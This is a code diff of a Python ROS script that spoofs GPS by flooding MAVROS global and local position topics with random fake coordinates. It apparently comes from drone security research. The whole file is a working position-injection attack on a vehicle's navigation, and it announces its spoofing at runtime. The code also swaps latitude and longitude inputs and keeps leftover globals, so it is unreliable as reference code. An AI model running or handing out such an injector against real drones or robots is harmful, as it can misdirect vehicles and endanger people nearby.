@@ -3,50 +3,67 @@ import rospy
 from sensor_msgs.msg import NavSatFix
 from nav_msgs.msg import Odometry
 import random
+import time
 
-gps = NavSatFix()
-local = Odometry()
+global_message = NavSatFix()
+local_message = Odometry()
 
-gps_pub = rospy.Publisher('/mavros/global_position/global', NavSatFix, queue_size = 10)
-local_pub = rospy.Publisher('/mavros/global_position/local', Odometry, queue_size = 10)
+global_publisher = rospy.Publisher('/mavros/global_position/global', NavSatFix, queue_size = 10)
+local_publisher = rospy.Publisher('/mavros/global_position/local', Odometry, queue_size = 10)
 rospy.init_node('gps_jamming')
 rate = rospy.Rate(1000)
 
 print("Lower Limit")
-X1 = input("Please enter the latitude: ")
-Y1 = input("Please enter the longitude: ")
+X1 = input("Please enter the latitude to be used for the spoofing: ")
+Y1 = input("Please enter the longitude to be used for the spoofing: ")
 
 print("Upper Limit")
-X2 = input("Please enter the latitude: ")
-Y2 = input("Please enter the longitude: ")
-print("Execution of the GPS jamming is active. ")
+X2 = input("Please enter the latitude to be used for the spoofing: ")
+Y2 = input("Please enter the longitude to be used for the spoofing: ")
 
-X = random.uniform(int(X1),int(X2))
-Y = random.uniform(int(Y1),int(Y2))
+longitude = random.uniform(float(X1),float(X2))
+latitude = random.uniform(float(Y1),float(Y2))
+
+first_local = True 
+first_global = True
+
 n = 0
 def jam():
-    global X, Y, n
+    global X, Y, n, longitude, latitude
 
     if n == 0:
-        X = random.uniform(int(X1),int(X2))
-        Y = random.uniform(int(Y1),int(Y2))
+        longitude = random.uniform(float(X1),float(X2))
+        latitude = random.uniform(float(Y1),float(Y2))
+
+        # add entered position as latitute and longitude to the NavSatFix
+        global_message.longitude = float(longitude)
+        global_message.latitude = float(latitude)
+
+        # add entered position to the Odometry 
+        local_message.pose.pose.position.x = global_message.longitude
+        local_message.pose.pose.position.y = global_message.latitude
+
         time.sleep(2)
     n = n + 1
 
-    local.pose.pose.position.x = X
-    local.pose.pose.position.y = Y
-    local_pub.publish(local)
+    local_publisher.publish(local_message)
+    global first_local
+    if first_local:
+        print("\nMessage with values is being spoofed to nav_msgs/Odometry")
+        first_local = False
 
-    if n == 100:
+    global_publisher.publish(global_message)
+    global first_global
+    if first_global:
+        print("\nMessage with values is being spoofed to sensor_msgs/NavSatFix")
+        first_global = False
+
+    if n == 10000:
         n = 0
 
-first = True
 try:
     while not rospy.is_shutdown():
-        if first:
-            print("GPS is spoofed")
-            first = False
-        spoof()
+        jam()
         rate.sleep()
 except KeyboardInterrupt:
     pass
